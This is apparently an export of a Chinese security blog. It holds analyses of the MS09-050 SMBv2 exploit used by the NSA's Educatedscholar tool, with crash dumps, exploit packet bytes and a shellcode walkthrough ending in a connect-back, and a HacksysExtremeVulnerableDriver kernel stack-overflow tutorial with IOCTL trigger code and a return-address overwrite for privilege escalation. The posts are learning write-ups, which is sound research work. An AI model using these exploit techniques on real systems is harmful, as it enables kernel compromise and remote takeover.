$t1+8 L$t2.killq .NET4 12345678910111213141516sxe ld clrjitg.load &quot;C:\\\\Psscor4\\\\x86\\\\x86\\\\psscor4.dll&quot;!bpmd mscorlib.dll System.Reflection.Assembly.Load.echo &quot;Weird bug... bp twice...&quot;!bpmd mscorlib.dll System.Reflection.Assembly.Loadgr $t1 = poi(esp+4).printf &quot;Byte array: &quot;;r $t1r $t2 = poi($t1+4).printf &quot;Size: &quot;;r $t2db $t1+8 L$t2.echo &quot;dump in the file: $&#123;$arg1&#125;&quot;.writemem $&#123;$arg1&#125; $t1+8 L$t2.killq","categories":[],"tags":[]},{"title":"Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比","slug":"Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比","date":"2017-08-26T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/","link":"","permalink":"https://www.giantbranch.cn/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/","excerpt":"","text":"环境搭建 到msdn I tell you下载完镜像安装完，ping 2008ping不通，但它ping外面却可以，后来发现是默认开启了防火墙，把防火墙关闭了就好 之后是漏洞利用不成功，原来还要安装域控 实验环境及工具如下： 2008 sp1 datacenter （装了域控）windbgVirtualKD-3.0wireshark 尝试分析一开始简单了解了一下smb协议，尝试抓取攻击包，看了一下，也看不出什么 于是就修改里面配置文件的返回地址什么的东西为0x41414141，马上发第一个包就崩溃了(一开始直接下断还断不下来，可能是因为那里初始的时候还不是代码) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105kd&gt; !analyze -v******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************SYSTEM_THREAD_EXCEPTION_NOT_HANDLED (7e)This is a very common bugcheck. Usually the exception address pinpointsthe driver/function that caused the problem. Always note this addressas well as the link date of the driver/image that contains this address.Arguments:Arg1: c0000005, The exception code that was not handledArg2: 80fcb986, The address that the exception occurred atArg3: 9aef6c54, Exception Record AddressArg4: 9aef6950, Context Record AddressDebugging Details:------------------EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - 0x%pFAULTING_IP: srv2!SrvConsumeDataAndComplete+b80fcb986 83611800 and dword ptr [ecx+18h],0EXCEPTION_RECORD: 9aef6c54 -- (.exr 0xffffffff9aef6c54)ExceptionAddress: 80fcb986 (srv2!SrvConsumeDataAndComplete+0x0000000b) ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000000NumberParameters: 2 Parameter[0]: 00000001 Parameter[1]: 41414141Attempt to write to address 41414141CONTEXT: 9aef6950 -- (.cxr 0xffffffff9aef6950)eax=9d9785d0 ebx=9d97b1a8 ecx=41414129 edx=00000000 esi=9d9785d0 edi=8c9cb5a4eip=80fcb986 esp=9aef6d1c ebp=9aef6d1c iopl=0 nv up ei pl zr na pe nccs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010246srv2!SrvConsumeDataAndComplete+0xb:80fcb986 83611800 and dword ptr [ecx+18h],0 ds:0023:41414141=????????Resetting default scopeDEFAULT_BUCKET_ID: STRING_DEREFERENCEPROCESS_NAME: SystemCURRENT_IRQL: 2ERROR_CODE: (NTSTATUS) 0xc0000005 - 0x%pEXCEPTION_PARAMETER1: 00000001EXCEPTION_PARAMETER2: 41414141WRITE_ADDRESS: 41414141 FOLLOWUP_IP: srv2!SrvConsumeDataAndComplete+b80fcb986 83611800 and dword ptr [ecx+18h],0BUGCHECK_STR: 0x7ELAST_CONTROL_TRANSFER: from 80fcaae2 to 80fcb986STACK_TEXT: 9aef6d1c 80fcaae2 9d9785d0 9d9785d0 80fc8800 srv2!SrvConsumeDataAndComplete+0xb9aef6d34 80fcaab4 9d9785d0 81b0f110 80fc8800 srv2!SrvProcCompleteRequest+0x239aef6d50 80fc919f 9d97b008 00000000 8c599ac0 srv2!SrvProcessPacket+0x889aef6d7c 81be2a1c 8ada8bd0 1119f9b9 00000000 srv2!SrvProcWorkerThread+0x19a9aef6dc0 81a3ba3e 80fc9005 8ada8b78 00000000 nt!PspSystemThreadStartup+0x9d00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16SYMBOL_STACK_INDEX: 0SYMBOL_NAME: srv2!SrvConsumeDataAndComplete+bFOLLOWUP_NAME: MachineOwnerMODULE_NAME: srv2IMAGE_NAME: srv2.sysDEBUG_FLR_IMAGE_TIMESTAMP: 47918aaaSTACK_COMMAND: .cxr 0xffffffff9aef6950 ; kbFAILURE_BUCKET_ID: 0x7E_srv2!SrvConsumeDataAndComplete+bBUCKET_ID: 0x7E_srv2!SrvConsumeDataAndComplete+bFollowup: MachineOwner---------kd&gt; dd 0xffdf0908ffdf0908 00c35646 00000000 00000000 00000000ffdf0918 00000000 00000000 00000000 00000000ffdf0928 00000000 00000000 00000000 00000000ffdf0938 00000000 00000000 00000000 00000000ffdf0948 00000000 00000000 00000000 00000000ffdf0958 00000000 00000000 00000000 00000000ffdf0968 00000000 00000000 00000000 00000000ffdf0978 00000000 00000000 00000000 00000000 后来就在这个崩溃的函数下断点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647kd&gt; bp srv2!SrvConsumeDataAndCompletekd&gt; gBreakpoint 0 hitsrv2!SrvConsumeDataAndComplete:97dc997b 8bff mov edi,edikd&gt; kvChildEBP RetAddr Args to Child 9715cd1c 97dc8ae2 8c6b0d10 8c6b0d10 97dc7300 srv2!SrvConsumeDataAndComplete (FPO: [Non-Fpo])9715cd34 97dc8ab4 8c6b0d10 81b0e110 97dc7300 srv2!SrvProcCompleteRequest+0x23 (FPO: [Non-Fpo])9715cd50 97dc719f 8c69c958 00000000 8bc6d020 srv2!SrvProcessPacket+0x88 (FPO: [Non-Fpo])9715cd7c 81be1a1c 8add3cf8 a6838496 00000000 srv2!SrvProcWorkerThread+0x19a (FPO: [Non-Fpo])9715cdc0 81a3aa3e 97dc7005 8add3ca0 00000000 nt!PspSystemThreadStartup+0x9d00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16kd&gt; dd esp9aaacd20 97dc8ae2 8c6b0d10 8c6b0d10 97dc73009aaacd30 97dc7300 9aaacd50 97dc8ab4 8c6b0d109aaacd40 81b0e110 97dc7300 8add3ca0 8c5c8bf09aaacd50 9aaacd7c 97dc719f 8c5c8bf0 000000009aaacd60 8abe18c8 00000000 00000000 000000009aaacd70 9aaacd80 00000006 00000006 9aaacdc09aaacd80 81be1a1c 8add3cf8 ab3c8496 000000009aaacd90 00000000 00000000 00000001 00000023kd&gt; dc 8c6b0d10 l608c6b0d10 424d53ff 00000072 c8531800 000001bb .SMBr.....S.....8c6b0d20 00000000 00000000 00000000 00000000 ................8c6b0d30 02014900 30356843 51463759 53575175 .I..Ch50Y7FQuQWS8c6b0d40 454c737a 58566272 72626d47 41414129 zsLErbVXGmbr)AAA8c6b0d50 5666474d 66734b58 58694138 64684b44 MGfVXKsf8AiXDKhd8c6b0d60 336d7338 44453063 3733394e 74437761 8sm3c0EDN937awCt8c6b0d70 354f7452 424a7946 6c736f59 70663465 RtO5FyJBYosle4fp8c6b0d80 ffdf02f4 ffdf02f4 ffdf02f4 34356576 ............ve548c6b0d90 7a317978 37444133 4d530200 2e322042 xy1z3AD7..SMB 2.8c6b0da0 00323030 00000000 00000000 00000002 002.............8c6b0db0 00000001 00000000 41414089 41414085 .........@AA.@AA8c6b0dc0 00000000 00000000 00000000 00000000 ................8c6b0dd0 00000000 00000000 00000000 00000000 ................8c6b0de0 00000000 00000000 00000000 00000000 ................8c6b0df0 00000004 00000000 00000000 00000000 ................8c6b0e00 00000000 00000000 00000000 00000000 ................8c6b0e10 00000000 00000000 00000000 00000000 ................8c6b0e20 00000000 00000000 00000000 00000000 ................8c6b0e30 00000000 00000000 ffffffff 7fffffff ................8c6b0e40 00000000 00000000 00000000 00000000 ................8c6b0e50 00000000 00000000 00000000 3fffffe6 ...............?8c6b0e60 00000001 00000000 00000000 00000000 ................8c6b0e70 00000000 00000000 00000000 00000000 ................8c6b0e80 00000000 00000000 00000000 00000000 ................ 发现这参数正是客户端发送的smb数据，而异常是获取smb数据+0x3c的数值作为地址+0x18后无法读取的异常这里的41414129应该是我们设置的值减了0x18后发送过来的 123456789101112131415161718PAGE:0003097B ; int __stdcall SrvConsumeDataAndComplete(PVOID DestinationBuffer)PAGE:0003097B _SrvConsumeDataAndComplete@4 proc near ; CODE XREF: SrvProcCompleteRequest(x,x,x)+1EPAGE:0003097BPAGE:0003097B DestinationBuffer= dword ptr 8PAGE:0003097BPAGE:0003097B mov edi, ediPAGE:0003097D push ebpPAGE:0003097E mov ebp, espPAGE:00030980 mov eax, [ebp+DestinationBuffer]PAGE:00030983 mov ecx, [eax+3Ch]PAGE:00030986 and dword ptr [ecx+18h], 0PAGE:0003098A mov ecx, [eax+3Ch]PAGE:0003098D and dword ptr [ecx+1Ch], 0PAGE:00030991 push eax ; DestinationBufferPAGE:00030992 call _SrvConsumeDataAndComplete2@4 ; SrvConsumeDataAndComplete2(x)PAGE:00030997 pop ebpPAGE:00030998 retn 4PAGE:00030998 _SrvConsumeDataAndComplete@4 endp 那我们把值改回原来的值0xffdf0908再调试 判断目标系统版本信息协商后，发送SMB Command: Session Setup AndX (0x73)包 然后服务器就怪怪返回了信息了（SMB Command: Session Setup AndX (0x73)） 两个的command都是0x73，怎么判断哪个是request，那个是response呢？原来在flags里（request是0，response是1） 后面两个包用意不知如何 Tree Connect AndX Request (0x75) Path: \\192.168.52.145\\IPC$ NT Create AndX Request (0xa2) File Name: browser 判断漏洞是否存在（存疑）下面仅为猜测，调试的时候是下面路径，但是调试的时候的NewIrql指向的并不是SMB的数据 最后下面这个条件也不满足就直接退出了 后来跟导师沟通，知道是处理Process ID High的时候导致一个错误的返回值从而进入错误流程下面为Smb2ValidateProviderCallback函数尾部截图 最终不等于0xC0000016，进入了错误流程 利用对任意地址+1的操作写入gadgets利用的指令如下 通过发一个包对目标地址+1，写入如下gadgets 下面以一个包为例子说明写入经过的流程 首先包传进来给srv2!SrvProcessPacket处理，其中NewIrql指向SMB数据，也即下面截图中的esi 下面这个就是else，调用SrvConsumeDataAndComplete SrvConsumeDataAndComplete又调用了调用SrvConsumeDataAndComplete2，其实就是将一些偏移置0 接下来开始是顺序执行 我们看看LABEL_56是什么，原来是刚刚调过的那个if里面最后的一小段 那我们继续跟看看，原来调用了这里 其实在这里面还可以跟 我们看看 LABEL_13 继续，就到下面的+1操作了 这里可能看得有点问题，看汇编好看一点 就这样完成了对任意地址+1的操作，过程真是漫长 最终写如效果如下 总结一下，就是通过控制某些偏移，控制if。整个过程如下： SrvProcessPacket—&gt;SrvProcCompleteRequest—&gt;SrvConsumeDataAndComplete—&gt;SrvConsumeDataAndComplete2—&gt;SrvProcCompleteRequest—&gt;SrvProcPartialCompleteCompoundedRequest 最后一个包利用漏洞分析可以从下面看到调用轨迹跟上面一样 12345678910111213141516171819kd&gt; ba e1 0xffdf0908kd&gt; bl 0 e ffdf0908 e 1 0001 (0001) kd&gt; gBreakpoint 0 hitffdf0908 46 inc esikd&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.8f4e9cc8 97dc8b93 8c5cb0e8 8c5cb128 00000000 0xffdf09088f4e9ce8 97dc996f 8c5cb0e8 00000000 00000001 srv2!SrvProcCompleteRequest+0xd4 (FPO: [Non-Fpo])8f4e9d10 97dc9997 3fffffe6 8f4e9d34 97dc8ae2 srv2!SrvConsumeDataAndComplete2+0x35e (FPO: [Non-Fpo])8f4e9d1c 97dc8ae2 8c5cb0e8 8c5cb0e8 97dc7300 srv2!SrvConsumeDataAndComplete+0x1c (FPO: [Non-Fpo])8f4e9d34 97dc8ab4 8c5cb0e8 81b0e110 97dc7300 srv2!SrvProcCompleteRequest+0x23 (FPO: [Non-Fpo])8f4e9d50 97dc719f 8bdfa3f0 00000000 8add31f8 srv2!SrvProcessPacket+0x88 (FPO: [Non-Fpo])8f4e9d7c 81be1a1c 00000000 bed8d496 00000000 srv2!SrvProcWorkerThread+0x19a (FPO: [Non-Fpo])8f4e9dc0 81a3aa3e 97dc7005 8add3ca0 00000000 nt!PspSystemThreadStartup+0x9d00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16 下面给出最后一次调用srv2!SrvProcCompleteRequest的流程 shellcode分析 最后就到达真正的shellcode处了 下面一步步跟一下shellcode 就跳到下面来 之后又跳转了，很多干扰 之后又是一个call，又跳回来 18c69a605 e8b2fcffff call 8c69a2bc 之后有一段寻找内存值为905A4Dh的，一开是不知道是什么 仔细一看，原来是PE文件头，后来发下你个地址每次的装载地址都不变，lm看了一下是ntkrpamp.exe这个模块的空间，这个应该是很重要的东西， 跟着通过上面ntkrpamp.exe这个找到很多内核的api地址 后来看到nt!_imp__VidBitBlt 正好指向上面的pe文件头，这个好像没啥用。。。 再后来就精彩了，既然找到api函数地址了，就开始调用了 首先nt!ExAllocatePool申请内存， (复制将要执行的汇编代码到这个申请的内存) 之后调用nt!PsGetCurrentProcess 接下来是一个循环查找svchost.exe，attach上去再detach，不断循环找到后进行如下操作： 123456789101112131415161718192021nt!KeStackAttachProcess(attach上去)通过独特的算法（xor，add等运算后和一个常量比较）寻找svchost.exe这个进程，attach上去之后nt!ZwAllocateVirtualMemory分配内存nt!PsGetCurrentThread通过nt!KeServiceDescriptorTable索引（eax+12C）---&gt;8be067a8 8b802c010000 mov eax,dword ptr [eax+12Ch]8be067ae 8b00 mov eax,dword ptr [eax] ds:0023:81b43b00=81ac49708be067b0 8b80f8050000 mov eax,dword ptr [eax+5F8h]8be067b6 894724 mov dword ptr [edi+24h],eaxnt!ObGetObjectSecurity+0x1cb6之后nt!HalPrivateDispatchTable之后nt!memset了两次，置0后重新复制最后KeUnstackDetachProcessnt!ExFreePool 最后回到nt!KeRemoveQueue，就启动了svchost尝试连接攻击者，怎么启动连接的还没搞清楚 与msf的简单对比发送的数据如下(AAAA后面的是返回地址，再之后就是加密的payload，payload部分没有全部展示出来) 12345678910111213141516171819202122232425262728293031328c69f530 ff 53 4d 42 72 00 00 00 00 18 53 c8 17 02 00 e9 .SMBr.....S.....8c69f540 58 01 00 00 00 00 00 00 00 00 00 00 00 00 8c 6e X..............n8c69f550 00 7b 03 02 04 0d df ff 04 0d df ff 04 0d df ff .&#123;..............8c69f560 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff ................8c69f570 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff ................8c69f580 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff ................8c69f590 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff ................8c69f5a0 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff ................8c69f5b0 04 0d df ff 04 0d df ff 00 02 53 4d 42 20 32 2e ..........SMB 2.8c69f5c0 30 30 32 00 00 00 00 00 00 00 00 00 00 00 00 00 002.............8c69f5d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f5e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f5f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................8c69f650 00 00 00 00 00 00 00 00 ff ff ff ff ff ff ff ff ................8c69f660 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB8c69f670 42 42 42 42 42 42 42 42 42 42 42 42 b4 ff ff 3f BBBBBBBBBBBB...?8c69f680 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA8c69f690 41 41 41 41 41 41 41 41 09 0d d0 ff fc fa eb 1e AAAAAAAA........8c69f6a0 5e 68 76 01 00 00 59 0f 32 89 46 5d 8b 7e 61 89 ^hv...Y.2.F].~a.8c69f6b0 f8 0f 30 b9 16 02 00 00 f3 a4 fb f4 eb fd e8 dd ..0.............8c69f6c0 ff ff ff 6a 00 9c 60 e8 00 00 00 00 58 8b 58 54 ...j..`.....X.XT8c69f6d0 89 5c 24 24 81 f9 de c0 ad de 75 10 68 76 01 00 .\\$$......u.hv..8c69f6e0 00 59 89 d8 31 d2 0f 30 31 c0 eb 31 8b 32 0f b6 .Y..1..01..1.2..8c69f6f0 1e 66 81 fb c3 00 75 25 8b 58 5c 8d 5b 69 89 1a .f....u%.X\\.[i..8c69f700 b8 01 00 00 80 0f a2 81 e2 00 00 10 00 74 0e ba .............t.............. 之后利用下面的代码对smb数据的第一个dword+1操作（之后漏洞利用的时候有用） 结果如下(0xff+1=0x00 进位，所以后面也要加1， 0x53+1=0x54) 利用的位置有点不一样，但大同小异（v36也是1，这是必须保证的） 之后就直到漏洞利用处，流程相对简单 对于开始的前两字节的写入，说明如下： 利用漏洞将返回地址处 197dc8b91 ffd0 call eax &#123;ffd00d09&#125; 那里是一个pop esi ret //kernels HAL memory region …no ASLR 12345678910111213141516kd&gt; gBreakpoint 0 hitffd00d09 5e pop esikd&gt; tffd00d0a c3 retkd&gt; t8c69f530 00544d42 add byte ptr [ebp+ecx*2+42h],dlkd&gt; dc 8c69f530 8c69f530 424d5400 00000072 c8531800 e9000217 .TMBr.....S.....8c69f540 00000158 00000000 00000000 e6540000 X.............T.8c69f550 02037b00 ffdf0d04 ffdf0d04 ffdf0d04 .&#123;..............8c69f560 ffdf0d04 ffdf0d04 ffdf0d04 ffdf0d04 ................8c69f570 00000000 00000000 97dacc1f 8c69f530 ............0.i.8c69f580 97dac57a 00000000 ffdf0d04 ffdf0d04 z...............8c69f590 ffdf0d04 ffdf0d04 ffdf0d04 ffdf0d04 ................8c69f5a0 ffdf0d04 ffdf0d04 ffdf0d04 ffdf0d04 ................ 从上可以看到跳到了smb数据开始处，正是开始的修改起了作用，利用得非常秒 最后就是真正地执行shellcode了，比NSA简单多了 总结 在NSA的工具中利用了两个漏洞，一个是对任意地址+1的操作，另一个是逻辑漏洞，没有对数据进行校验，就直接call了 当时傻傻地跟，由于对 lock xadd 指令不熟悉，所以对其印象深刻，后来看看NSA工具的输出，为什么发那么多包，回想一下应该这个指令+1操作了，后来对地址下写入断点确认了 猜想：搞那么长调用路径，目标应该是使SrvProcCompleteRequest的第3个参数为1，从而执行call eax NSA整个漏洞利用的过程： 先探测目标系统的版本信息 判断该目标是否存在 利用对任意地址+1的操作写入gadgets，最后利用逻辑漏洞跳到gadgets处利用漏洞 shellcode很多坑，很能抗静态分析，相对复杂，基本只能动态跟 一些小问题： 一开始直接下断还断不下来，应该是因为那里初始的时候还不是代码，ba e1比较好 搭建环境挺浪费时间的","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"nsa工具","slug":"nsa工具","permalink":"https://www.giantbranch.cn/tags/nsa工具/"}]},{"title":"内核缓冲区溢出学习之第一个内核缓冲区溢出提权","slug":"内核缓冲区溢出学习之第一个内核缓冲区溢出提权","date":"2017-08-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/","link":"","permalink":"https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/","excerpt":"","text":"打造双机调试环境自己搜索资料 首先加载有漏洞的驱动 之后我们可以从windbg查看加载的模块，命令：lm 看一下第一个StackOverflow的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include \"StackOverflow.h\"#ifdef ALLOC_PRAGMA #pragma alloc_text(PAGE, TriggerStackOverflow) #pragma alloc_text(PAGE, StackOverflowIoctlHandler)#endif // ALLOC_PRAGMA#pragma auto_inline(off)/// &lt;summary&gt;/// Trigger the Stack Overflow Vulnerability/// &lt;/summary&gt;/// &lt;param name=\"UserBuffer\"&gt;The pointer to user mode buffer&lt;/param&gt;/// &lt;param name=\"Size\"&gt;Size of the user mode buffer&lt;/param&gt;/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) &#123; NTSTATUS Status = STATUS_SUCCESS; ULONG KernelBuffer[BUFFER_SIZE] = &#123;0&#125;; //内核buffer //这个宏可以确保调用线程运行在一个允许分页的足够低IRQL级别。 PAGED_CODE(); __try &#123; // Verify if the buffer resides in user mode // The ProbeForRead routine checks that a user-mode buffer actually resides in the user portion of the address space, and is correctly aligned. ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer)); // 输出调试信息 DbgPrint(\"[+] UserBuffer: 0x%p\\n\", UserBuffer); DbgPrint(\"[+] UserBuffer Size: 0x%X\\n\", Size); DbgPrint(\"[+] KernelBuffer: 0x%p\\n\", &amp;KernelBuffer); DbgPrint(\"[+] KernelBuffer Size: 0x%X\\n\", sizeof(KernelBuffer));#ifdef SECURE // Secure Note: This is secure because the developer is passing a size // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence, // there will be no overflow // 这个是安全的，应该这里以内核buffer的大小做复制 RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));#else DbgPrint(\"[+] Triggering Stack Overflow\\n\"); // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability // because the developer is passing the user supplied size directly to // RtlCopyMemory()/memcpy() without validating if the size is greater or // equal to the size of KernelBuffer RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);#endif &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; Status = GetExceptionCode(); DbgPrint(\"[-] Exception Code: 0x%X\\n\", Status); &#125; return Status;&#125;/// &lt;summary&gt;/// Stack Overflow Ioctl Handler/// &lt;/summary&gt;/// &lt;param name=\"Irp\"&gt;The pointer to IRP&lt;/param&gt;/// &lt;param name=\"IrpSp\"&gt;The pointer to IO_STACK_LOCATION structure&lt;/param&gt;/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;NTSTATUS StackOverflowIoctlHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) &#123; SIZE_T Size = 0; PVOID UserBuffer = NULL; NTSTATUS Status = STATUS_UNSUCCESSFUL; UNREFERENCED_PARAMETER(Irp); PAGED_CODE(); UserBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer; Size = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength; if (UserBuffer) &#123; // 触发缓冲区溢出 Status = TriggerStackOverflow(UserBuffer, Size); &#125; return Status;&#125;#pragma auto_inline() 这个代码的漏洞原理很简单，就是下面这一行，最后的size是用户可控的，而不是安全的sizeof(KernelBuffer) 1RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size); 先了解一下程序 我们从ida可以看到IOCTL为0x222003时跳转到StackOverflowIoctlHandler 接下来我们进入TriggerStackOverflow函数看看，可以看到KernelBuffer的大小为0x800（0x81c-0x1c） 我们开始编写程序 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; HANDLE hDevice; DWORD length = 0; BOOL ret; char UserBuffer[] = \"giantbranch\"; // 打开设备驱动（下面为什么这么多\\,因为转义啊） hDevice = CreateFile(\"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0); if (hDevice == INVALID_HANDLE_VALUE) &#123; printf(\"打开设备驱动出错\\n\"); &#125; ret = DeviceIoControl(hDevice, //驱动句柄 0x222003, //IoControlCode UserBuffer, //输入缓冲区指针 11, //输入缓冲区长度 NULL, //输出缓冲区指针 0, //输出缓冲区长度 &amp;length, //返回实际的数据字节数 NULL); if (!ret) &#123; printf(\"DeviceIoControl失败\\n\"); &#125; else&#123; printf(\"DeviceIoControl成功\\n\"); &#125; CloseHandle(hDevice); return 0;&#125; 运行 但是windbg没有任何回应啊 后来发现是什么没开什么的（http://www.osronline.com/article.cfm?article=295） 使用 ed nt!Kd_DEFAULT_MASK 8 即可收到DbgPrint的输出，我们重启启动驱动就可以看到输出了 在运行我们编写的程序，就可以看到输出了，可以看到成功打入含有缓冲区溢出的代码 我们发送下面的字符看看 1234memset(UserBuffer, 0x41, UserBufferSize);for (int i = 0; i &lt; 52; i = i + 4)&#123; memset(UserBuffer + 2048 + i , 0x41 + i , 4);&#125; 果然崩溃了，!analyze -v分析一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131: kd&gt; !analyze -vConnected to Windows 7 7601 x86 compatible target at (Thu Aug 24 16:02:14.817 2017 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols.........................................................................................................................................................Loading User Symbols....Loading unloaded module list.......******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************Unknown bugcheck code (0)Unknown bugcheck descriptionArguments:Arg1: 00000000Arg2: 00000000Arg3: 00000000Arg4: 00000000Debugging Details:------------------*** ERROR: Symbol file could not be found. Defaulted to export symbols for KERNELBASE.dll - *** ERROR: Symbol file could not be found. Defaulted to export symbols for kernel32.dll - *** WARNING: Unable to verify checksum for ConsoleApplication1.exe*** ERROR: Module load completed but symbols could not be loaded for ConsoleApplication1.exePROCESS_NAME: ConsoleApplicaFAULTING_IP: +1b61616161 ?? ???EXCEPTION_RECORD: ffffffff -- (.exr 0xffffffffffffffff)ExceptionAddress: 61616161 ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000008NumberParameters: 2 Parameter[0]: 00000008 Parameter[1]: 61616161Attempt to execute non-executable address 61616161ERROR_CODE: (NTSTATUS) 0xc0000005 - 0x%pEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - 0x%pEXCEPTION_PARAMETER1: 00000008EXCEPTION_PARAMETER2: 61616161WRITE_ADDRESS: 61616161 FOLLOWUP_IP: nt!IofCallDriver+6384288086 5e pop esiFAILED_INSTRUCTION_ADDRESS: +d3d2faf0bc1dbfc61616161 ?? ???BUGCHECK_STR: ACCESS_VIOLATIONDEFAULT_BUCKET_ID: VISTA_DRIVER_FAULTCURRENT_IRQL: 0LAST_CONTROL_TRANSFER: from 6d6d6d6d to 61616161STACK_TEXT: WARNING: Frame IP not in any known module. Following frames may be wrong.8fe7badc 6d6d6d6d 71717171 88f5a5a0 88f5a610 0x616161618fe7bafc 84288086 86b73030 88f5a5a0 88f5a5a0 0x6d6d6d6d8fe7bb14 8447ccb9 87c50bc8 88f5a5a0 88f5a610 nt!IofCallDriver+0x638fe7bb34 8447fea2 86b73030 87c50bc8 00000000 nt!IopSynchronousServiceTail+0x1f88fe7bbd0 844c647c 86b73030 88f5a5a0 00000000 nt!IopXxxControlFile+0x6aa8fe7bc04 8428ed26 0000001c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a8fe7bc04 77547024 0000001c 00000000 00000000 nt!KiSystemServicePostCall0020f920 77545804 75779965 0000001c 00000000 ntdll!KiFastSystemCallRet0020f924 75779965 0000001c 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc0020f984 765cba7d 0000001c 00222003 0051a430 KERNELBASE!DeviceIoControl+0xe90020f9b0 003910d7 0000001c 00222003 0051a430 kernel32!DeviceIoControl+0x480020f9f0 003912da 00000001 00516dd0 00519d10 ConsoleApplication1+0x10d70020fa38 765cee2c 7ffdf000 0020fa84 7756393e ConsoleApplication1+0x12da0020fa44 7756393e 7ffdf000 7751f61c 00000000 kernel32!BaseThreadInitThunk+0x120020fa84 77563911 00391357 7ffdf000 00000000 ntdll!__RtlUserThreadStart+0x700020fa9c 00000000 00391357 7ffdf000 00000000 ntdll!_RtlUserThreadStart+0x1bSTACK_COMMAND: kbSYMBOL_STACK_INDEX: 2SYMBOL_NAME: nt!IofCallDriver+63FOLLOWUP_NAME: MachineOwnerMODULE_NAME: ntIMAGE_NAME: ntkrpamp.exeDEBUG_FLR_IMAGE_TIMESTAMP: 54011f7fFAILURE_BUCKET_ID: ACCESS_VIOLATION_BAD_IP_nt!IofCallDriver+63BUCKET_ID: ACCESS_VIOLATION_BAD_IP_nt!IofCallDriver+63Followup: MachineOwner--------- 我们算一下，加入按0x61的偏移算的话，0x61-0x41 = 32由于我上面的代码是一次+4的，所以这个就是偏移，所以最终是2048+32 = 2080 其实因为buffer在ebp-0x81c处，0x81c=2076，在加4，因为ebp，那么返回地址就是2080 修改我们发送的字符串 12345memset(UserBuffer, 0x41, UserBufferSize);UserBuffer[2080] = (DWORD)&amp;TokenStealingShellcodeWin7 &amp; 0x000000FF;UserBuffer[2080 + 1] = ((DWORD)&amp;TokenStealingShellcodeWin7 &amp; 0x0000FF00) &gt;&gt; 8;UserBuffer[2080 + 2] = ((DWORD)&amp;TokenStealingShellcodeWin7 &amp; 0x00FF0000) &gt;&gt; 16;UserBuffer[2080 + 3] = ((DWORD)&amp;TokenStealingShellcodeWin7 &amp; 0xFF000000) &gt;&gt; 24; 还有UserBufferSize改为2084，因为过长，溢出会覆盖一些栈上的变量，可能是TriggerStackOverflow函数上层的其他变量，导致执行失败 再用一下别人的shellcode 